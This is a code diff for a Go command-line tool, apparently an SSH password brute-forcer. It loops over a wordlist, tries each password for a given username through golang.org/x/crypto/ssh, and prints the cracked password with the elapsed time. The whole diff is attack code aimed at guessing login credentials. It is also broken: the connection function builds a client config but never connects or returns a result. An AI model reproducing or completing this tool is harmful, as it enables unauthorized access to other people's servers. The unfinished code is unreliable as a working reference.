@@ -3,6 +3,7 @@ package main
 import (
 	"bufio"
 	"fmt"
+	"golang.org/x/crypto/ssh"
 	"io/ioutil"
 	"log"
 	"os"
@@ -46,15 +47,37 @@ func bruteforce(filename string, reader *bufio.Reader) {
 
 	status := false
 	t1 := time.Now()
-
 	for index, password := range wordlist {
 		status = sshconnection(username, password)
+		t2 := time.Now()
+		fmt.Println("Password - ",password," | Status - ",status,"| Password left - ",len(wordlist)-index+1)
+		if status {
+			fmt.Println("-----------------------------------")
+			fmt.Println("Password is - ",password)
+			fmt.Println("Total time taken - ",t2.Sub(t1))
+			fmt.Println("-----------------------------------")
+			break
+		}
+	}
+	t2 := time.Now()
+	if !status {
+		fmt.Println("-----------------------------------")
+		fmt.Println("Password is - Not found")
+		fmt.Println("Total time taken - ",t2.Sub(t1))
+		fmt.Println("-----------------------------------")
 	}
 
 }
 
 func sshconnection(username string, password string) bool {
+	defer cleanup()
 
+	config := ssh.ClientConfig{
+		User: username,
+		Auth: []ssh.AuthMethod{
+			ssh.Password(password),
+		},
+	}
 }
 
 func one(reader *bufio.Reader) {
